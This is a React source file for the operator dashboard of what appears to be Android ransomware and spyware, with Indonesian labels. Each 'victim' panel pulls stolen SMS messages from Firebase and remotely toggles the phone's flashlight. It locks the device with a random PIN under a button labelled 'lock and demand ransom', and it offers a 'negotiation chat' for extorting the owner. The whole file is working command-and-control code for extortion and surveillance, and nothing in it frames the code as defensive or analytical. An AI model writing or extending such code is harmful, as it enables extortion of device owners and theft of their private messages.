"use client";
import { useEffect, useState } from "react";
import { ref, onValue, set } from "firebase/database";
import { rtdb } from "@/lib/firebase";

export default function VictimPanel({ params }: { params: { id: string } }) {
  const [sms, setSms] = useState([]);
  const [flashOn, setFlashOn] = useState(false);
  const [lockPin, setLockPin] = useState("");
  const [chatMessages, setChatMessages] = useState([]);
  const [newMsg, setNewMsg] = useState("");

  const sendCommand = (command: string, extra?: any) => {
    fetch(`/api/victims/${params.id}/command`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ command, ...extra }),
    });
  };

  // Listener SMS dari node victim (dikirim APK ke Firebase)
  useEffect(() => {
    const smsRef = ref(rtdb, `victims/${params.id}/sms`);
    const unsub = onValue(smsRef, snapshot => {
      if (snapshot.exists()) setSms(snapshot.val());
    });
    return () => unsub();
  }, [params.id]);

  // Listener chat
  useEffect(() => {
    const chatRef = ref(rtdb, `chats/${params.id}/messages`);
    const unsub = onValue(chatRef, snapshot => {
      const msgs = [];
      snapshot.forEach(child => msgs.push(child.val()));
      setChatMessages(msgs);
    });
    return () => unsub();
  }, [params.id]);

  const sendChat = () => {
    fetch("/api/chat", {
      method: "POST",
      body: JSON.stringify({ victimId: params.id, message: newMsg }),
    });
    setNewMsg("");
  };

  return (
    <div>
      <h2>Kendali Victim {params.id}</h2>
      <button onClick={() => sendCommand("read_sms")}>Ambil SMS</button>
      <button onClick={() => sendCommand(flashOn ? "flashlight_off" : "flashlight_on")}>
        {flashOn ? "Matikan Senter" : "Nyalakan Senter"}
      </button>
      <button onClick={() => sendCommand("lock", { pin: Math.random().toString().slice(2, 6) })}>
        Kunci & Minta Tebusan
      </button>
      <button onClick={() => sendCommand("unlock", { pin: lockPin })}>
        Buka Kunci dengan PIN
      </button>
      <input value={lockPin} onChange={e => setLockPin(e.target.value)} placeholder="PIN unlock" />

      <h3>SMS Masuk</h3>
      <ul>{sms.map((s: any, i: number) => <li key={i}>{s.address}: {s.body}</li>)}</ul>

      <h3>Chat Negosiasi</h3>
      <div>{chatMessages.map((m: any, i: number) => <p key={i}><b>{m.sender}:</b> {m.text}</p>)}</div>
      <input value={newMsg} onChange={e => setNewMsg(e.target.value)} />
      <button onClick={sendChat}>Kirim</button>
    </div>
  );
}
